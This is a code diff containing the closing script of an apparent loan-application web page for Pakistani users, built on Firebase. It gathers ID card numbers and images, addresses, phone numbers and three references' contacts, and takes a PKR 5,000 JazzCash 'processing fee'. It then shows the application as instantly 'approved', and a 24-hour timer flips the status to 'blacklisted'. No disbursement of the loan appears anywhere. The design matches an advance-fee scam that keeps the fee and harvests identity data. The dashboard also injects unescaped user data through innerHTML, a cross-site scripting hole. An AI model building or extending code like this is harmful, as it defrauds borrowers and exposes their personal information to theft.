+                const dueDateString = dueDate.toLocaleDateString('en-PK', { 
+                    year: 'numeric', 
+                    month: 'long', 
+                    day: 'numeric' 
+                });
+                dueDateElement.textContent = dueDateString;
+                
+                // Prepare application data (without ID images)
+                const applicationData = {
+                    userId: currentUser.uid,
+                    email: currentUser.email,
+                    applicationId: applicationId,
+                    personalInfo: userData.personalInfo,
+                    paymentInfo: {
+                        transactionId: transactionIdInput.value.trim(),
+                        amount: 5000,
+                        paymentDate: new Date().toISOString()
+                    },
+                    status: 'approved',
+                    appliedAt: firebase.firestore.FieldValue.serverTimestamp(),
+                    loanAmount: 50000,
+                    repaymentAmount: 55800,
+                    dueDate: dueDate,
+                    references: userData.personalInfo.references
+                };
+
+                // Save to Firestore
+                await db.collection('loanApplications').doc(currentUser.uid).set(applicationData);
+                
+                // Mark transaction as used
+                await db.collection('usedTransactions').doc(transactionIdInput.value.trim()).set({
+                    used: true,
+                    usedBy: currentUser.uid,
+                    usedAt: firebase.firestore.FieldValue.serverTimestamp()
+                });
+
+                // Proceed to confirmation
+                steps.step3.classList.remove('active');
+                steps.step4.classList.add('active');
+                
+                stepIndicators.step3.classList.remove('active');
+                stepIndicators.step3.classList.add('completed');
+                stepIndicators.step4.classList.add('active');
+                
+                // Show blacklist message after 24 hours (86400000 milliseconds)
+                setTimeout(() => {
+                    blacklistMessage.style.display = 'block';
+                    dashboardBlacklistMessage.style.display = 'block';
+                    
+                    // Update status in Firestore
+                    db.collection('loanApplications').doc(currentUser.uid).update({
+                        status: 'blacklisted'
+                    });
+                }, 86400000); // 24 hours
+            } catch (error) {
+                alert('Error submitting application: ' + error.message);
+                console.error('Submission error:', error);
+            } finally {
+                submitButton.innerHTML = originalText;
+                submitButton.disabled = false;
+            }
+        });
+        
+        backToStep1.addEventListener('click', () => {
+            steps.step2.classList.remove('active');
+            steps.step1.classList.add('active');
+            
+            stepIndicators.step2.classList.remove('active');
+            stepIndicators.step1.classList.add('active');
+            stepIndicators.step1.classList.remove('completed');
+        });
+        
+        backToStep2.addEventListener('click', () => {
+            steps.step3.classList.remove('active');
+            steps.step2.classList.add('active');
+            
+            stepIndicators.step3.classList.remove('active');
+            stepIndicators.step2.classList.add('active');
+            stepIndicators.step2.classList.remove('completed');
+        });
+        
+        // Transaction ID validation
+        transactionIdInput.addEventListener('input', async function() {
+            const txId = this.value.trim();
+            if (txId.length > 5) { // Only check if reasonable length
+                try {
+                    const doc = await db.collection('usedTransactions').doc(txId).get();
+                    if (doc.exists) {
+                        transactionError.style.display = 'block';
+                        this.style.borderColor = 'red';
+                    } else {
+                        transactionError.style.display = 'none';
+                        this.style.borderColor = '#ddd';
+                    }
+                } catch (error) {
+                    console.error('Error checking transaction ID:', error);
+                }
+            }
+        });
+        
+        // Update dashboard with current data
+        function updateDashboard() {
+            const now = new Date();
+            const appDate = new Date();
+            
+            // Calculate days remaining
+            const timeDiff = dueDate.getTime() - now.getTime();
+            const daysRemaining = Math.ceil(timeDiff / (1000 * 3600 * 24));
+            
+            // Update user email
+            userEmailElement.textContent = currentUser.email;
+            
+            // Create active loan section HTML
+            activeLoanSection.innerHTML = `
+                <div class="dashboard-card">
+                    <h3><i class="fas fa-info-circle"></i> Application Status</h3>
+                    <div class="info-row">
+                        <span class="info-label">Application ID:</span>
+                        <span class="info-value">${applicationId}</span>
+                    </div>
+                    <div class="info-row">
+                        <span class="info-label">Status:</span>
+                        <span class="info-value"><span class="status-badge status-approved">Approved</span></span>
+                    </div>
+                    <div class="info-row">
+                        <span class="info-label">Application Date:</span>
+                        <span class="info-value">${appDate.toLocaleDateString('en-PK', { 
+                            year: 'numeric', 
+                            month: 'long', 
+                            day: 'numeric' 
+                        })}</span>
+                    </div>
+                    <div class="info-row">
+                        <span class="info-label">Loan Amount:</span>
+                        <span class="info-value">PKR 50,000</span>
+                    </div>
+                    <div class="info-row">
+                        <span class="info-label">Processing Fee:</span>
+                        <span class="info-value">PKR 5,000</span>
+                    </div>
+                </div>
+                
+                <div class="dashboard-card">
+                    <h3><i class="fas fa-calendar-check"></i> Repayment Details</h3>
+                    <div class="info-row">
+                        <span class="info-label">Repayment Amount:</span>
+                        <span class="info-value">PKR 55,800</span>
+                    </div>
+                    <div class="info-row">
+                        <span class="info-label">Due Date:</span>
+                        <span class="info-value">${dueDate.toLocaleDateString('en-PK', { 
+                            year: 'numeric', 
+                            month: 'long', 
+                            day: 'numeric' 
+                        })}</span>
+                    </div>
+                    <div class="info-row">
+                        <span class="info-label">Days Remaining:</span>
+                        <span class="info-value">${daysRemaining > 0 ? 
+                            `${daysRemaining} days` : 'Due today'}</span>
+                    </div>
+                    <div class="info-row">
+                        <span class="info-label">Daily Interest:</span>
+                        <span class="info-value">PKR 193.33</span>
+                    </div>
+                    <div class="info-row">
+                        <span class="info-label">Interest Rate:</span>
+                        <span class="info-value">11.6% (monthly)</span>
+                    </div>
+                </div>
+                
+                <div class="dashboard-card">
+                    <h3><i class="fas fa-user"></i> Personal Information</h3>
+                    <div class="info-row">
+                        <span class="info-label">Full Name:</span>
+                        <span class="info-value">${userData.personalInfo.fullName}</span>
+                    </div>
+                    <div class="info-row">
+                        <span class="info-label">ID Card Number:</span>
+                        <span class="info-value">${userData.personalInfo.idCardNumber}</span>
+                    </div>
+                    <div class="info-row">
+                        <span class="info-label">Mobile Number:</span>
+                        <span class="info-value">${userData.personalInfo.mobileNumber}</span>
+                    </div>
+                    <div class="info-row">
+                        <span class="info-label">Address:</span>
+                        <span class="info-value">${userData.personalInfo.residenceAddress}</span>
+                    </div>
+                </div>
+                
+                <div class="dashboard-card">
+                    <h3><i class="fas fa-money-bill-wave"></i> Payment Information</h3>
+                    <div class="info-row">
+                        <span class="info-label">Transaction ID:</span>
+                        <span class="info-value">${userData.paymentInfo.transactionId || transactionIdInput.value.trim()}</span>
+                    </div>
+                    <div class="info-row">
+                        <span class="info-label">Payment Date:</span>
+                        <span class="info-value">${new Date().toLocaleDateString('en-PK', { 
+                            year: 'numeric', 
+                            month: 'long', 
+                            day: 'numeric' 
+                        })}</span>
+                    </div>
+                    <div class="info-row">
+                        <span class="info-label">Payment Status:</span>
+                        <span class="info-value">Completed</span>
+                    </div>
+                    <div class="info-row">
+                        <span class="info-label">Payment Method:</span>
+                        <span class="info-value">JazzCash</span>
+                    </div>
+                    <div class="info-row">
+                        <span class="info-label">Amount Paid:</span>
+                        <span class="info-value">PKR 5,000</span>
+                    </div>
+                </div>
+                
+                <div class="dashboard-card">
+                    <h3><i class="fas fa-users"></i> References</h3>
+                    <div class="reference-item">
+                        <h4><i class="fas fa-user"></i> ${userData.personalInfo.references[0].name}</h4>
+                        <div class="reference-details">
+                            <span class="reference-contact">Contact:</span>
+                            <span class="reference-number">${userData.personalInfo.references[0].contact}</span>
+                        </div>
+                    </div>
+                    
+                    <div class="reference-item">
+                        <h4><i class="fas fa-user"></i> ${userData.personalInfo.references[1].name}</h4>
+                        <div class="reference-details">
+                            <span class="reference-contact">Contact:</span>
+                            <span class="reference-number">${userData.personalInfo.references[1].contact}</span>
+                        </div>
+                    </div>
+                    
+                    <div class="reference-item">
+                        <h4><i class="fas fa-user"></i> ${userData.personalInfo.references[2].name}</h4>
+                        <div class="reference-details">
+                            <span class="reference-contact">Contact:</span>
+                            <span class="reference-number">${userData.personalInfo.references[2].contact}</span>
+                        </div>
+                    </div>
+                </div>
+                
+                <div class="dashboard-card">
+                    <h3><i class="fas fa-file-invoice-dollar"></i> Loan Terms</h3>
+                    <div class="info-row">
+                        <span class="info-label">Loan Purpose:</span>
+                        <span class="info-value">Personal Loan</span>
+                    </div>
+                    <div class="info-row">
+                        <span class="info-label">Loan Duration:</span>
+                        <span class="info-value">30 days</span>
+                    </div>
+                    <div class="info-row">
+                        <span class="info-label">Early Repayment:</span>
+                        <span class="info-value">Allowed with full interest</span>
+                    </div>
+                    <div class="info-row">
+                        <span class="info-label">Late Payment Fee:</span>
+                        <span class="info-value">PKR 500 per day</span>
+                    </div>
+                    <div class="info-row">
+                        <span class="info-label">Repayment Method:</span>
+                        <span class="info-value">Bank Transfer or JazzCash</span>
+                    </div>
+                </div>
+            `;
+        }
+        
+        // Validation functions
+        function validateStep1() {
+            const requiredFields = [
+                'full-name', 'id-card-number', 'residence-address', 'mobile-number',
+                'ref1-name', 'ref1-contact', 'ref2-name', 'ref2-contact',
+                'ref3-name', 'ref3-contact'
+            ];
+            
+            let isValid = true;
+            
+            for (const fieldId of requiredFields) {
+                const field = document.getElementById(fieldId);
+                if (!field.value.trim()) {
+                    field.style.borderColor = 'red';
+                    isValid = false;
+                } else {
+                    field.style.borderColor = '#ddd';
+                }
+            }
+            
+            if (!isValid) {
+                alert('Please fill in all required fields marked in red!');
+                return false;
+            }
+            
+            // Validate mobile number format
+            const mobile = document.getElementById('mobile-number').value;
+            if (!/^03\d{9}$/.test(mobile)) {
+                alert('Please enter a valid Pakistani mobile number (e.g., 03001234567)');
+                document.getElementById('mobile-number').style.borderColor = 'red';
+                return false;
+            }
+            
+            return true;
+        }
+        
+        function validateStep2() {
+            let isValid = true;
+            
+            if (!idFrontInput.files || !idFrontInput.files[0]) {
+                frontUploadBox.style.borderColor = 'red';
+                isValid = false;
+            } else {
+                frontUploadBox.style.borderColor = '#ddd';
+            }
+            
+            if (!idBackInput.files || !idBackInput.files[0]) {
+                backUploadBox.style.borderColor = 'red';
+                isValid = false;
+            } else {
+                backUploadBox.style.borderColor = '#ddd';
+            }
+            
+            if (!isValid) {
+                alert('Please view both front and back of your ID card!');
+                return false;
+            }
+            
+            return true;
+        }
+        
+        async function validateStep3() {
+            const txId = transactionIdInput.value.trim();
+            
+            if (!txId) {
+                alert('Please enter your transaction ID!');
+                transactionIdInput.style.borderColor = 'red';
+                return false;
+            }
+            
+            if (txId.length < 6) {
+                alert('Transaction ID must be at least 6 characters!');
+                transactionIdInput.style.borderColor = 'red';
+                return false;
+            }
+            
+            // Check if transaction ID already used
+            try {
+                const doc = await db.collection('usedTransactions').doc(txId).get();
+                if (doc.exists) {
+                    alert('This transaction ID has already been used!');
+                    transactionIdInput.style.borderColor = 'red';
+                    transactionError.style.display = 'block';
+                    return false;
+                }
+            } catch (error) {
+                alert('Error checking transaction ID: ' + error.message);
+                return false;
+            }
+            
+            transactionIdInput.style.borderColor = '#ddd';
+            transactionError.style.display = 'none';
+            return true;
+        }
+
+        // Initialize the application
+        document.addEventListener('DOMContentLoaded', () => {
+            // Set dashboard as default view
+            dashboardSection.classList.add('active');
+            
+            // Reset all form fields on page load
+            registrationForm.reset();
+            loginForm.reset();
+            document.getElementById('personal-info-form').reset();
+            document.getElementById('id-verification-form').reset();
+            document.getElementById('payment-form').reset();
+            
+            // Clear any stored data
+            userData = {
+                personalInfo: {},
+                paymentInfo: {}
+            };
+            
+            // Check if user is already logged in
+            auth.onAuthStateChanged((user) => {
+                if (user) {
+                    currentUser = user;
+                    dashboardSection.classList.add('active');
+                    loginSection.classList.remove('active');
+                    registrationSection.classList.remove('active');
+                    
+                    // Check for active loan
+                    checkActiveLoan();
+                }
+            });
+        });
+    </script>
+</body>
+</html>
